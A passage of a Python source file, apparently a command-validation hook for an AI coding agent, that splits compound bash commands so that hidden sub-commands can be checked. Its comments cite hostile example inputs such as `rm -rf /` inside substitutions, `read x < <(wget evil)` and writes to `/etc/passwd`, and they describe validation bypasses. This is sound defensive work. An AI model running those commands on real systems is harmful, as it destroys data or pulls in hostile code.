#!/usr/bin/env python3
"""
Bash Command Parser for Claude Code PreToolUse Hook

Parses compound bash commands, splitting on operators while respecting:
- Quotes (don't split on operators inside quotes)
- Escapes (handle backslash escaping)
- Environment variables (strip leading KEY=VALUE assignments)
- Redirections (ignore >, >>, 2>&1, etc.)
"""

import re
from typing import List, Optional, Tuple


class BashCommandParser:
    """Parse and split compound bash commands"""

    # Operators that separate commands
    # Note: an unquoted newline IS a command separator (treated like ';').
    # Escaped/continuation newlines, quoted newlines, heredoc bodies, and
    # command-substitution newlines are handled specially and do NOT split.
    OPERATORS = ['&&', '||', '|', ';']

    # Redirection operators (NOT command separators)
    REDIRECTIONS = ['>', '>>', '<', '<>', '<<', '2>&1', '2>', '&>', '&>>', '1>&2', '2>>', '1>', '<&', '>&']

    # Redirections that take an argument (file/fd)
    REDIRECTIONS_WITH_ARG = ['>', '>>', '<', '<>', '<<', '2>', '&>', '&>>', '2>>', '1>']

    # Redirections that don't take an argument
    REDIRECTIONS_NO_ARG = ['2>&1', '1>&2', '<&', '>&']

    # Words after which a NEW command may begin, so a `case` appearing right
    # after one is the `case` KEYWORD rather than an argument. Used to gate
    # case-statement recognition: mistaking an argument for the keyword would
    # make us drop the following tokens as pattern text, which could hide a real
    # command from validation. Terminators (`done`, `fi`, `esac`) are absent —
    # a command can only follow them after a separator, which sets the flag
    # anyway.
    CMD_POSITION_WORDS = frozenset({
        'if', 'then', 'elif', 'else', 'while', 'until', 'do', '{', '!', 'time',
    })

    # Redirections that WRITE to their path operand (create/truncate/append, or
    # point stdout/stderr at a file). Pure reads (`<`, `<<`) are excluded: they
    # consume an existing file, they neither create nor overwrite one, so their
    # target needs no write-destination gating. `<>` opens for read AND write
    # and CREATES the file when absent, so it IS a write. The fd-dup forms in
    # REDIRECTIONS_NO_ARG carry no path and so are absent here too.
    WRITE_REDIRECTIONS_WITH_ARG = ['>', '>>', '<>', '2>', '&>', '&>>', '2>>', '1>']

    def __init__(self):
        """Initialize parser"""
        pass

    def parse_compound_command(self, command: str) -> List[str]:
        """
        Split compound command into individual sub-commands

        Args:
            command: Full bash command (may contain pipes, &&, etc.)

        Returns:
            List of normalized sub-commands

        Examples:
            "git status" → ["git status"]
            "git diff | head -100" → ["git diff", "head -100"]
            "GIT_PAGER=cat git diff" → ["git diff"]
            "npm install && npm test" → ["npm install", "npm test"]
        """
        return [cmd for cmd, _offset in self.parse_with_offsets(command)]

    def parse_with_offsets(self, command: str) -> List[Tuple[str, int]]:
        """
        Like parse_compound_command, but pairs each sub-command with the source
        offset at which its execution anchors. Callers that reason about
        execution order (e.g. "is this function defined before it is called?")
        need this; the bare string list discards it.

        The anchor offset is:
        - for a top-level sub-command: the source offset of its first token;
        - for a command extracted from a $()/`...` substitution: the source
          offset of the enclosing substitution. All commands inside a
          substitution share that anchor because they execute together, when
          the enclosing statement runs.

        Note the returned ORDER is top-level sub-commands first (in source
        order), then substitution-extracted commands appended — the same shape
        parse_compound_command has always produced. The offsets are what convey
        true source order; do not infer it from list position.
        """
        if not command or not command.strip():
            return []

        # Tokenize the command
        tokens = self._tokenize_with_quotes(command)

        # Split on operators
        command_groups = self._split_on_operators(tokens)

        # Normalize each group (strip env vars, clean whitespace)
        result = []
        for group in command_groups:
            normalized = self._normalize_command(group)
            if normalized:
                result.append((normalized, group[0][2]))

        # Also extract commands from command substitutions recursively. Each
        # extracted command anchors at the substitution's own source offset, so
        # a function defined AFTER the substitution cannot appear to precede a
        # call made INSIDE it.
        for token_type, token_value, token_offset in tokens:
            if token_type == 'CMD_SUBST' and token_value.strip():
                # Recursively parse the content of command substitutions
                for sub_cmd, _rel_offset in self.parse_with_offsets(token_value):
                    result.append((sub_cmd, token_offset))

        return result

    @staticmethod
    def _parse_heredoc_delim(command: str, i: int) -> Tuple[Optional[str], int]:
        """
        Parse a heredoc operator at `command[i:]` (caller guarantees
        `command[i:i+2] == '<<'`).

        Returns `(delimiter, j)` where `j` is the index just past the delimiter
        token, or `(None, i)` if this is not a heredoc that introduces a body
        (a bare `<<` with no delimiter word, or a `<<<` here-string). Mirrors
        the delimiter parsing in `_tokenize_with_quotes` so the two stay in
        sync — the quote around the delimiter (`<<'EOF'`) is consumed but does
        not affect how the body is matched.
        """
        # `<<<` is a here-string, not a heredoc: it has no multi-line body.
        if command[i:i+3] == '<<<':
            return None, i
        j = i + 2
        while j < len(command) and command[j] in (' ', '\t'):
            j += 1
        quote_char = None
        if j < len(command) and command[j] in ('"', "'"):
            quote_char = command[j]
            j += 1
        delim_start = j
        while j < len(command) and (command[j].isalnum() or command[j] == '_'):
            j += 1
        delimiter = command[delim_start:j]
        if not delimiter:
            return None, i
        if quote_char is not None and j < len(command) and command[j] == quote_char:
            j += 1
        return delimiter, j

    def _scan_paren_subst(self, command: str, start: int) -> Tuple[str, int]:
        """
        Scan a `$(...)` command substitution beginning at `start` (the `$`).

        Returns (content, end) where `content` is the text between `$(` and the
        matching `)`, and `end` is the index just past that `)`. Quote state is
        tracked so a `)` inside a quoted string (e.g. a regex `[^)]`) does not
        close the substitution prematurely, and nested `$(...)` raise the depth.

        A heredoc body inside the substitution (`$(cat <<'EOF' ... EOF)`) is
        skipped wholesale: its text is data, not shell, so an apostrophe
        (`node's`), a stray quote, or an unbalanced paren in the body must not
        flip quote state or move the depth count, which would mislocate the
        closing `)` and leak the tail back out as bogus sub-commands.
        """
        depth = 1
        i = start + 2
        quote = None  # None, "'", or '"'
        heredoc_delim = None  # active heredoc delimiter, once `<<DELIM` is seen
        heredoc_seen_nl = False  # body begins after the first newline past `<<`
        n = len(command)
        while i < n and depth > 0:
            c = command[i]
            # Inside a heredoc body: skip every char until a line equal to the
            # delimiter, mirroring the top-level tokenizer's body handling.
            if heredoc_delim is not None and heredoc_seen_nl:
                if c == '\n':
                    i += 1
                    if command[i:i+len(heredoc_delim)] == heredoc_delim:
                        i += len(heredoc_delim)
                        heredoc_delim = None
                    continue
                i += 1
                continue
            if c == '\\' and quote != "'" and i + 1 < n:
                i += 2
                continue
            if quote:
                if c == quote:
                    quote = None
                i += 1
                continue
            if c in ('"', "'"):
                quote = c
                i += 1
                continue
            if heredoc_delim is None and command[i:i+2] == '<<':
                delim, j = self._parse_heredoc_delim(command, i)
                if delim is not None:
                    heredoc_delim = delim
                    heredoc_seen_nl = False
                    i = j
                    continue
            if c == '\n' and heredoc_delim is not None and not heredoc_seen_nl:
                heredoc_seen_nl = True
                i += 1
                continue
            if c == '(':
                depth += 1
            elif c == ')':
                depth -= 1
            i += 1
        return command[start + 2:i - 1], i

    def _scan_backtick(self, command: str, start: int) -> Tuple[str, int]:
        """
        Scan a `` `...` `` command substitution beginning at `start` (the
        opening backtick).

        Returns (content, end) where `content` is the text between the
        backticks and `end` is the index just past the closing backtick. A
        backslash escapes the next character (including an embedded backtick).

        A heredoc body inside the substitution (`` `cat <<EOF ... EOF` ``) is
        skipped wholesale so a literal backtick in the body cannot prematurely
        close the substitution — the symmetric hazard to the apostrophe/quote
        leak handled in `_scan_paren_subst`.
        """
        i = start + 1
        n = len(command)
        heredoc_delim = None
        heredoc_seen_nl = False
        while i < n:
            c = command[i]
            if heredoc_delim is not None and heredoc_seen_nl:
                if c == '\n':
                    i += 1
                    if command[i:i+len(heredoc_delim)] == heredoc_delim:
                        i += len(heredoc_delim)
                        heredoc_delim = None
                    continue
                i += 1
                continue
            if c == '\\' and i + 1 < n:
                i += 2
                continue
            if heredoc_delim is None and command[i:i+2] == '<<':
                delim, j = self._parse_heredoc_delim(command, i)
                if delim is not None:
                    heredoc_delim = delim
                    heredoc_seen_nl = False
                    i = j
                    continue
            if c == '\n' and heredoc_delim is not None and not heredoc_seen_nl:
                heredoc_seen_nl = True
                i += 1
                continue
            if c == '`':
                i += 1
                break
            i += 1
        return command[start + 1:i - 1], i

    def _scan_arith(self, command: str, start: int) -> Tuple[int, List[Tuple[str, int]]]:
        """
        Scan an arithmetic expansion `$((...))` beginning at `start` (the `$`).

        Arithmetic runs no command, so its operands must NOT be validated as
        commands. Returns (end, nested) where `end` is the index just past the
        closing `))` (or end-of-string if unterminated) and `nested` is a list
        of (content, abs_offset) for command substitutions found INSIDE the
        arithmetic — those DO execute (`$(( $(cmd) + 1 ))`) and must still be
        surfaced. The literal span `command[start:end]` is left for the caller
        to keep glued to its token.
        """
        paren_depth = 0
        i = start + 1  # consume '$'; start counting at the first '('
        while i < len(command):
            c = command[i]
            if c == '\\' and i + 1 < len(command):
                i += 2  # skip escaped char
                continue
            if c == '(':
                paren_depth += 1
            elif c == ')':
                paren_depth -= 1
                if paren_depth == 0:
                    i += 1  # consume the final ')'
                    break
            i += 1
        interior_start = start + 3
        interior_end = i - 2 if paren_depth == 0 else i
        interior = command[interior_start:interior_end]
        nested = []
        if interior.strip():
            for t_type, t_val, t_off in self._tokenize_with_quotes(interior):
                if t_type == 'CMD_SUBST':
                    nested.append((t_val, interior_start + t_off))
        return i, nested

    def _tokenize_with_quotes(self, command: str) -> List[Tuple[str, str]]:
        """
        Tokenize command into (type, value) pairs

        Token types:
        - ENV: Environment variable assignment (KEY=VALUE)
        - WORD: Regular word/argument
        - OP: Operator (|, &&, ||, ;)
        - REDIRECT: Redirection operator
        - QUOTED: Quoted string
        - HEREDOC_CONTENT: Content inside a heredoc (not parsed as commands)
        - CMD_SUBST: Command substitution $(...) or `...`
        - CASE_PATTERN: A `case` arm pattern (data, not a command; dropped)

        Args:
            command: Command string

        Returns:
            List of (type, value) tuples
        """
        tokens = []
        current = []
        current_start = 0  # Source offset where the current token buffer began
        in_quote = None  # None, "'", or '"'
        escaped = False
        i = 0

        # Heredoc handling
        heredoc_delimiter = None  # The delimiter we're looking for
        heredoc_seen_first_nl = False  # Track if we've passed first newline after <<

        # Command substitution handling
        cmd_subst_depth = 0  # Paren depth inside $(...)
        in_backtick = False  # Inside `...`

        # Conditional-expression handling. `[[` opens a bash conditional and `]]`
        # closes it; inside, `&&`/`||`/`|` are conditional connectors (not command
        # separators) and `<`/`>` are string comparisons (not redirections). So
        # while in_conditional we suppress operator/redirect detection and let
        # those characters fall through as ordinary word content, keeping the
        # whole `[[ ... ]]` as one sub-command. Command substitutions inside it
        # ARE still extracted (handled before the operator checks), so a
        # `[[ $(rm -rf /) ]]` still validates `rm -rf /` on its own.
        in_conditional = False

        # Case-statement handling. `case WORD in pat1|pat2) body ;; ... esac`
        # puts a PATTERN LIST where a command would otherwise be, and inside it
        # `|` alternates patterns while `)` closes the list — neither is a
        # command separator. Without this, `case "$f" in *docs*|*tmp*) continue;;`
        # splits into bogus sub-commands (`*docs*`, `*tmp*) continue`) that match
        # no allow pattern, forcing a prompt for a harmless script.
        #
        # case_stack holds one entry per open `case`, so nesting works. States:
        #   'case_word' — consumed `case`, awaiting its WORD operand
        #   'await_in'  — awaiting the `in` that opens the pattern list
        #   'pattern'   — inside a pattern list (data, not commands)
        #   'body'      — inside an arm body (normal commands) until `;;`
        # Pattern words are emitted as CASE_PATTERN and dropped when splitting;
        # a command substitution inside a pattern is still emitted separately
        # (bash does expand it) and so is still validated.
        case_stack = []
        case_paren_depth = 0  # extglob nesting inside the current pattern list

        # True while the next word would begin a new command. Gates `case`
        # recognition: without it, an argument that merely spells `case`
        # (`echo case ... in`) would flip us into pattern mode and DROP the
        # commands that follow — a bypass, not just a mis-parse.
        at_cmd_start = True

        def flush_current():
            """Flush current token buffer"""
            nonlocal in_conditional, at_cmd_start
            if not current:
                return
            token_str = ''.join(current)
            current.clear()

            in_pattern = bool(case_stack) and case_stack[-1] == 'pattern'

            # Advance the case state machine BEFORE emitting, so the `in` that
            # opens a pattern list and the `esac` that closes the statement are
            # themselves still emitted as ordinary words.
            if case_stack and case_stack[-1] == 'case_word':
                case_stack[-1] = 'await_in'
            elif case_stack and case_stack[-1] == 'await_in':
                if token_str == 'in':
                    case_stack[-1] = 'pattern'
                else:
                    # Not the `case WORD in` shape after all — abandon it rather
                    # than start dropping tokens as patterns.
                    case_stack.pop()
            elif token_str == 'esac' and case_stack:
                case_stack.pop()
                in_pattern = False
            elif token_str == 'case' and at_cmd_start and not in_pattern:
                case_stack.append('case_word')

            if in_pattern:
                tokens.append(('CASE_PATTERN', token_str, current_start))
            else:
                tokens.append(self._classify_token(token_str, current_start))
                # `[[` / `]]` are recognized only as standalone tokens (bash
                # requires them space-separated), so toggling on the flushed
                # word is exact — a glued `a[[b` or `${arr[[i]]}` never matches.
                if token_str == '[[':
                    in_conditional = True
                elif token_str == ']]':
                    in_conditional = False

            # A `KEY=VALUE` env prefix precedes the command it applies to, so it
            # leaves command position intact; every other word consumes it
            # unless it is a keyword that introduces a further command.
            if tokens[-1][0] != 'ENV':
                at_cmd_start = token_str in self.CMD_POSITION_WORDS

        def emit_separator(value, offset):
            """Append a command separator, reopening command position."""
            nonlocal at_cmd_start
            tokens.append(('OP', value, offset))
            at_cmd_start = True

        while i < len(command):
            # While the buffer is empty, keep the start offset pinned to the
            # current position; once we append a char it freezes until the next
            # flush, marking where this token began in the source.
            if not current:
                current_start = i
            char = command[i]

            # Handle heredoc mode (looking for delimiter)
            # Only activate heredoc mode after we've seen the first newline
            if heredoc_delimiter is not None and heredoc_seen_first_nl:
                # We're inside heredoc content, look for delimiter at start of line
                if char == '\n':
                    # End of line - check if next line starts with delimiter
                    i += 1
                    # Check if the delimiter appears at start of next line
                    if command[i:i+len(heredoc_delimiter)] == heredoc_delimiter:
                        # Found the delimiter! Consume it, but leave the newline
                        # that follows so the newline handler can emit a command
                        # separator — otherwise a command after the heredoc (e.g.
                        # `cat <<EOF\n...\nEOF\necho done`) would merge into the
                        # heredoc command.
                        i += len(heredoc_delimiter)
                        heredoc_delimiter = None
                        continue
                    # Not the delimiter, continue in heredoc mode
                    continue
                # Skip all heredoc content (don't tokenize it)
                i += 1
                continue

            # Handle escape (outside of single quotes)
            if escaped:
                current.append(char)
                escaped = False
                i += 1
                continue

            if char == '\\' and in_quote != "'":  # Backslash doesn't escape in single quotes
                # Check for line continuation (backslash followed by newline)
                if i + 1 < len(command) and command[i+1] == '\n':
                    # Line continuation - skip both the backslash and newline
                    i += 2
                    continue
                escaped = True
                current.append(char)
                i += 1
                continue

            # Handle quotes
            if char in ('"', "'"):
                if in_quote == char:
                    # Closing quote
                    current.append(char)
                    in_quote = None
                    i += 1
                    continue
                elif in_quote is None:
                    # Opening quote
                    in_quote = char
                    current.append(char)
                    i += 1
                    continue
                else:
                    # Different quote inside quoted string
                    current.append(char)
                    i += 1
                    continue

            # If in quote, add everything literally — with one exception:
            # inside DOUBLE quotes bash still performs command substitution. A
            # `$(...)` or `` `...` `` within "..." runs a command, and its own
            # quotes are balanced independently of the surrounding double quote
            # (so an inner `"` does NOT close the outer one). Without this, the
            # inner `"` flips our quote state and desyncs everything after it —
            # e.g. `git commit -m "$(cat <<'EOF' ... "quoted" ... EOF)"` splits
            # the commit body into bogus sub-commands. We extract the
            # substitution as a CMD_SUBST token (so the command it runs is
            # validated by the recursive pass) while keeping its literal text
            # glued to the current token, so the surrounding quoted word stays
            # intact. Single quotes suppress all expansion, so they fall through
            # to the literal append below.
            #
            # `$((...))` is arithmetic (runs no command) and must be checked
            # FIRST, since `$(` is a prefix of `$((`: without this an in-quote
            # `"sum=$((1+2))"` would mis-extract `1+2` as a bogus command.
            # Process substitution `<(...)`/`>(...)` is NOT performed inside
            # double quotes, so it is intentionally absent here.
            if in_quote == '"' and command[i:i+3] == '$((':
                arith_start = i
                end, nested = self._scan_arith(command, i)
                current.extend(command[arith_start:end])
                for content, off in nested:
                    tokens.append(('CMD_SUBST', content, off))
                i = end
                continue
            if in_quote == '"' and command[i:i+2] == '$(':
                subst_content, end = self._scan_paren_subst(command, i)
                tokens.append(('CMD_SUBST', subst_content, i))
                current.extend(command[i:end])
                i = end
                continue
            if in_quote == '"' and char == '`':
                subst_content, end = self._scan_backtick(command, i)
                tokens.append(('CMD_SUBST', subst_content, i))
                current.extend(command[i:end])
                i = end
                continue

            # If in quote, add everything literally
            if in_quote:
                current.append(char)
                i += 1
                continue

            # Handle arithmetic expansion $((...)). The arithmetic itself runs NO
            # command — it evaluates to a number — so its operands must NOT be
            # validated as commands. Without this, `$((pass+1))` is mistaken for a
            # command substitution and its inner text `pass+1` is checked as a
            # command, which matches no allow pattern and forces the whole
            # compound command to `ask`. bash distinguishes `$((` (arithmetic)
            # from a `$( (subshell) )` command substitution by the absence of a
            # space, so a glued `$((` is unambiguously arithmetic.
            #
            # BUT a command substitution nested inside the arithmetic DOES execute
            # (`$(( $(rm -rf /) + 1 ))` really runs `rm`), so we cannot swallow
            # the span blind. We keep the literal text glued to the current token
            # (so `pass=$((pass+1))` stays one assignment and `echo $((1+2))`
            # keeps its argument) and then re-tokenize the interior, surfacing any
            # nested $()/`` `` substitutions as CMD_SUBST tokens so the recursive
            # extractor still validates the commands they run.
            if command[i:i+3] == '$((' and cmd_subst_depth == 0 and not in_backtick:
                arith_start = i
                # Keep the literal text glued to the current token (so
                # `pass=$((pass+1))` stays one assignment and `echo $((1+2))`
                # keeps its argument); forward only the command substitutions
                # nested inside, with offsets mapped to absolute source
                # positions so the function-definition ordering logic holds.
                end, nested = self._scan_arith(command, i)
                current.extend(command[arith_start:end])
                for content, off in nested:
                    tokens.append(('CMD_SUBST', content, off))
                i = end
                continue

            # Handle process substitution <( ... ) and >( ... ). The inner
            # command runs in a subshell with its stdout/stdin wired to a
            # /dev/fd path, so it DOES execute and must be extracted and
            # validated on its own — exactly like $(...). Without this the
            # leading `<`/`>` is tokenized as a redirect and the inner command's
            # text leaks into the surrounding sub-command, hiding it: e.g.
            # `read x < <(wget evil)` would otherwise collapse to a harmless
            # `read` and auto-allow. The `<`/`>` is matched glued to `(` (bash
            # requires no space), which disambiguates it from a plain `< file`
            # redirect or a `(subshell)`. We emit the interior as a CMD_SUBST
            # token (the recursive extractor parses it) and drop it from the
            # surrounding command; the preceding redirect operator, if any, was
            # already tokenized separately and its now-empty target is harmless.
            if command[i:i+2] in ('<(', '>(') and cmd_subst_depth == 0 and not in_backtick:
                flush_current()
                cmd_subst_depth = 1
                i += 2  # skip the `<`/`>` and the opening `(`
                subst_start = i
                # Track quote state so a `)` inside a quoted string (e.g. a regex
                # `[^)]`) does not prematurely close the substitution — same
                # hazard as the `$(...)` scanner above.
                subst_quote = None  # None, "'", or '"'
                while i < len(command) and cmd_subst_depth > 0:
                    c = command[i]
                    if c == '\\' and subst_quote != "'" and i + 1 < len(command):
                        i += 2  # skip escaped char
                        continue
                    if subst_quote:
                        if c == subst_quote:
                            subst_quote = None
                        i += 1
                        continue
                    if c in ('"', "'"):
                        subst_quote = c
                        i += 1
                        continue
                    if c == '(':
                        cmd_subst_depth += 1
                    elif c == ')':
                        cmd_subst_depth -= 1
                    i += 1
                # Interior excludes the opening `(` (already skipped) and the
                # closing `)` (i now points just past it).
                subst_content = command[subst_start:i-1]
                tokens.append(('CMD_SUBST', subst_content, subst_start))
                continue

            # Handle command substitution $(
            if command[i:i+2] == '$(' and cmd_subst_depth == 0:
                current_str = ''.join(current)
                env_prefix = self._is_env_prefix(current_str)

                if not env_prefix:
                    flush_current()

                subst_start = i
                subst_content, end = self._scan_paren_subst(command, i)
                tokens.append(('CMD_SUBST', subst_content, subst_start))

                if env_prefix:
                    # Part of env var value — keep the literal `$(...)` in the
                    # current token.
                    current.extend(command[subst_start:end])

                i = end
                continue

            # Handle backtick command substitution
            if char == '`' and not in_backtick and cmd_subst_depth == 0:
                current_str = ''.join(current)
                env_prefix = self._is_env_prefix(current_str)

                if not env_prefix:
                    flush_current()

                subst_start = i
                subst_content, end = self._scan_backtick(command, i)
                tokens.append(('CMD_SUBST', subst_content, subst_start))

                if env_prefix:
                    # Part of env var value — keep the literal `` `...` `` in
                    # the current token.
                    current.extend(command[subst_start:end])

                i = end
                continue

            # If inside command substitution, treat most chars literally
            if cmd_subst_depth > 0 or in_backtick:
                current.append(char)
                i += 1
                continue

            # Check for heredoc operator (<<). Suppressed inside `[[ ]]`, where
            # `<` is a string comparison, not a redirection.
            if command[i:i+2] == '<<' and not in_conditional:
                flush_current()
                # Check if it's quoted or unquoted heredoc
                j = i + 2
                # Skip whitespace after <<
                while j < len(command) and command[j] in (' ', '\t'):
                    j += 1

                # Check for quoted delimiter
                quote_char = None
                if j < len(command) and command[j] in ('"', "'"):
                    quote_char = command[j]
                    j += 1

                # Extract delimiter (alphanumerics and underscore)
                delim_start = j
                while j < len(command) and (command[j].isalnum() or command[j] == '_'):
                    j += 1
                delimiter = command[delim_start:j]

                # Skip closing quote if we had one
                if quote_char is not None and j < len(command) and command[j] == quote_char:
                    j += 1

                if delimiter:
                    heredoc_delimiter = delimiter
                    heredoc_seen_first_nl = False  # Will look for delimiter after first newline
                    tokens.append(('REDIRECT', '<<', i))
                    # Skip to after the delimiter (and closing quote if any)
                    i = j
                    continue

            # File-descriptor prefix on a redirection: a digit run glued with
            # no space to a redirect operator (`2>`, `3<>`, `4>>`) names the fd
            # bash should redirect. Only fires at a token boundary (nothing
            # buffered) so `foo3>bar` keeps `foo3` as a word, matching bash. The
            # fd number is irrelevant for allowlisting, so we drop it and emit
            # the bare operator — which also stops the digit from leaking out as
            # a phantom command word (the bug that mis-parsed `exec 3<>/dev/...`
            # into a `3 /dev/... 2` non-command).
            #
            # Skipped when the digit already begins a recognized fused operator
            # (`2>&1`, `2>>`, `1>`): the normal operator check below handles
            # those whole. Skipped for the heredoc (`n<<`) and fd-dup (`n>&m`,
            # `n<&m`) forms, whose trailing fd/delimiter is not a path operand —
            # they keep their existing handling.
            if (char.isdigit() and not current and not in_conditional
                    and not self._check_operator(command, i)):
                j = i
                while j < len(command) and command[j].isdigit():
                    j += 1
                fd_op = self._check_operator(command, j) if j < len(command) else ''
                if (fd_op and fd_op != '<<' and self._is_redirect(fd_op)
                        and fd_op not in self.REDIRECTIONS_NO_ARG):
                    tokens.append(('REDIRECT', fd_op, i))
                    i = j + len(fd_op)
                    continue

            in_case_pattern = bool(case_stack) and case_stack[-1] == 'pattern'

            # Inside a `case` pattern list, `)` closes the list and hands control
            # back to normal command parsing. A `(` that STARTS a pattern word is
            # the optional list-opener bash allows (`(a|b) cmd;;`) and is dropped;
            # a `(` glued inside a word opens an extglob (`@(a|b)`) whose own `)`
            # must not be mistaken for the closer, so track its depth.
            if in_case_pattern and char == '(':
                if not current and case_paren_depth == 0:
                    i += 1  # optional `(` before the pattern list
                    continue
                case_paren_depth += 1
                current.append(char)
                i += 1
                continue
            if in_case_pattern and char == ')':
                if case_paren_depth > 0:
                    case_paren_depth -= 1
                    current.append(char)
                    i += 1
                    continue
                flush_current()
                case_stack[-1] = 'body'
                case_paren_depth = 0
                # The arm body is a new command; without a separator here it
                # would merge into the `case ... in` header token group.
                emit_separator(';', i)
                i += 1
                continue

            # An `esac` glued to an arm terminator (`... ;; esac;; ...`) closes an
            # INNER case, and the terminator then belongs to the ENCLOSING arm.
            # Operator detection is suppressed in pattern mode, so without this
            # the buffer would grow to `esac;;`, the state machine would never
            # see a bare `esac`, and the inner case would stay open — swallowing
            # the outer statement's remaining arms as pattern text. Flush it here
            # so the pop happens, then re-read the `;` in the popped state.
            if in_case_pattern and char == ';' and ''.join(current) == 'esac':
                flush_current()
                continue

            # `;;` ends a case arm and returns to pattern parsing, so the NEXT
            # arm's pattern list is read as data rather than as commands. The
            # bash fallthrough forms `;&` and `;;&` terminate an arm too.
            if case_stack and case_stack[-1] == 'body' and char == ';':
                term = next((t for t in (';;&', ';;', ';&')
                             if command[i:i+len(t)] == t), None)
                if term:
                    flush_current()
                    emit_separator(';', i)
                    case_stack[-1] = 'pattern'
                    case_paren_depth = 0
                    i += len(term)
                    continue

            # Check for operators (only when not quoted). Inside a `[[ ]]`
            # conditional, &&/||/|/<>/ are expression operators, not command
            # separators, so they fall through to ordinary word content. The
            # same holds inside a `case` pattern list, where `|` alternates
            # patterns and `<`/`>` are literal pattern characters. The exception
            # is a closing `]]` glued to this operator (e.g. `]];`, `]]|`): it
            # hasn't been flushed yet, so in_conditional is still True — flush it
            # now to end the conditional and let the operator split.
            op = self._check_operator(command, i)
            if op and in_conditional and ''.join(current) == ']]':
                flush_current()  # flips in_conditional False
            if op and not in_conditional and not in_case_pattern:
                flush_current()
                # Classify operator as OP or REDIRECT
                if self._is_redirect(op):
                    tokens.append(('REDIRECT', op, i))
                else:
                    emit_separator(op, i)
                i += len(op)
                continue

            # Handle comments - skip from # to end of line (when not in quotes)
            if char == '#' and in_quote is None:
                # Skip everything until end of line
                while i < len(command) and command[i] != '\n':
                    i += 1
                # Don't skip the newline itself - let the newline handler process it
                continue

            # Whitespace separates tokens (including newlines)
            if char in (' ', '\t'):
                flush_current()
                i += 1
                continue

            # Newline handling
            if char == '\n':
                flush_current()
                # The newline that immediately follows a heredoc operator begins
                # the heredoc body — it transitions us into content mode and is
                # NOT a command separator.
                if heredoc_delimiter is not None and not heredoc_seen_first_nl:
                    heredoc_seen_first_nl = True
                else:
                    # An unquoted newline separates commands, just like ';'.
                    # (Quoted, escaped/continuation, heredoc, and command-subst
                    # newlines are handled before reaching this point.)
                    emit_separator(';', i)
                i += 1
                continue

            # Regular character
            current.append(char)
            i += 1

        # Flush final token
        flush_current()

        return tokens

    def _check_operator(self, command: str, pos: int) -> str:
        """
        Check if position starts with an operator

        Args:
            command: Full command string
            pos: Current position

        Returns:
            Operator string if found, empty string otherwise
        """
        # Check multi-character operators first (longest match)
        for op in ['&&', '||', '2>&1', '>>', '&>>', '2>>', '<<', '<>', '1>&2', '>&', '<&', '1>']:
            if command[pos:pos+len(op)] == op:
                return op

        # Check single-character operators (not newline - newlines are handled separately)
        if command[pos] in ('|', ';', '>', '<'):
            return command[pos]

        return ''

    def _is_redirect(self, op: str) -> bool:
        """Check if operator is a redirection"""
        return op in self.REDIRECTIONS

    # Characters permitted in a value we treat as a substitutable constant.
    # Deliberately narrow: a literal path/word with no shell-active characters
    # (no $ or backtick expansion, no whitespace, no glob *?[]). Expanding only
    # such values can never introduce a command the user did not literally type.
    _CONSTANT_VALUE_RE = re.compile(r'^[A-Za-z0-9_./:@%+,=-]+$')

    @staticmethod
    def is_constant_value(value: str):
        """
        If a `KEY=VALUE` assignment's VALUE is a safe literal constant, return
        the literal (with surrounding quotes stripped); otherwise return None.

        "Safe" means an optionally single/double-quoted literal made only of
        path/word characters — no parameter or command expansion ($, ``), no
        glob (*?[]), no whitespace. Substituting such a value for a later
        `$KEY` merely reveals the command the user already wrote, so it can be
        re-validated normally; it can never hide a command behind a variable.

        Examples:
            '/usr/local/bin/godot' -> '/usr/local/bin/godot'
            '"clang++"'            -> 'clang++'
            '$(which godot)'       -> None   (command substitution)
            'a b'                  -> None   (whitespace)
            '*.txt'               -> None   (glob)
        """
        if value is None:
            return None
        v = value
        if len(v) >= 2 and v[0] == v[-1] and v[0] in ('"', "'"):
            v = v[1:-1]
        if not v or not BashCommandParser._CONSTANT_VALUE_RE.match(v):
            return None
        return v

    def extract_assignments(self, command: str) -> List[Tuple[str, str, int]]:
        """
        Extract standalone variable assignments from a compound command.

        Only `KEY=VALUE` statements that stand alone as a whole sub-command are
        returned — not a `KEY=VALUE cmd` env prefix. The distinction matters:
        a standalone assignment persists for the rest of the script (so later
        `$KEY` uses see it), whereas an env prefix applies to that one command
        only. A group qualifies when it has no WORD token (see below).

        Returns (name, raw_value, offset) tuples in source order. The value is
        raw (quotes intact); callers apply is_constant_value() to decide whether
        it is safe to substitute. The offset is the assignment's source offset,
        used to enforce that a use is only resolved by an assignment that
        lexically precedes it.

        A standalone-assignment group is one whose tokens are only ENV (or the
        CMD_SUBST tokens the tokenizer splits out of a value like
        `X=$(...)`), with no WORD — i.e. it runs no command of its own. Dynamic
        values ARE reported (as their raw, non-constant text) on purpose: a
        later constant-resolution must see that a reassignment like
        `GODOT=$(echo rm)` poisons an earlier `GODOT=/usr/local/bin/godot`,
        otherwise `$GODOT` could be validated against the stale safe path.
        """
        if not command or not command.strip():
            return []
        tokens = self._tokenize_with_quotes(command)
        groups = self._split_on_operators(tokens)
        assignments = []
        for group in groups:
            if not group:
                continue
            # No WORD token => the group assigns variables but runs no command.
            if all(t[0] in ('ENV', 'CMD_SUBST') for t in group) and \
                    any(t[0] == 'ENV' for t in group):
                for t_type, t_val, t_off in group:
                    if t_type != 'ENV':
                        continue
                    name, _sep, value = t_val.partition('=')
                    assignments.append((name, value, t_off))
        return assignments

    @staticmethod
    def _strip_quotes(value: str) -> str:
        """Strip one layer of matching surrounding single/double quotes."""
        v = value
        if len(v) >= 2 and v[0] == v[-1] and v[0] in ('"', "'"):
            v = v[1:-1]
        return v

    def extract_write_redirect_targets(self, command: str) -> List[Tuple[str, int]]:
        """
        Return (target, offset) for every output redirection that WRITES to a
        path, across the whole compound command — recursing into command
        substitutions, whose redirects execute too (`$(evil > /etc/x)`).

        The split/normalize path strips redirects AND their target tokens (see
        _split_on_operators), so the validator otherwise never sees where output
        is written. This surfaces those write targets so a caller can gate them
        by destination.

        One layer of surrounding quotes is stripped from the target; the text is
        otherwise returned verbatim, so an unexpanded `$VAR`/`$(...)` stays
        visible and the caller can refuse to vouch for an unresolvable location.
        Only path-operand writes are returned; fd-dup forms (`2>&1`, `>&`) carry
        no target and are skipped.

        Examples:
            'echo x > /etc/passwd'      -> [('/etc/passwd', 7)]
            'grep x 2>/dev/null'        -> [('/dev/null', 9)]
            'cmd >> "$LOG"'             -> [('$LOG', 7)]
            'a 2>&1 | b'                -> []   (fd-dup, no path)
            'cat < in.txt'             -> []   (read, not a write)
        """
        if not command or not command.strip():
            return []
        return self._scan_write_targets(command)

    def _scan_write_targets(self, command: str) -> List[Tuple[str, int]]:
        tokens = self._tokenize_with_quotes(command)
        targets = []
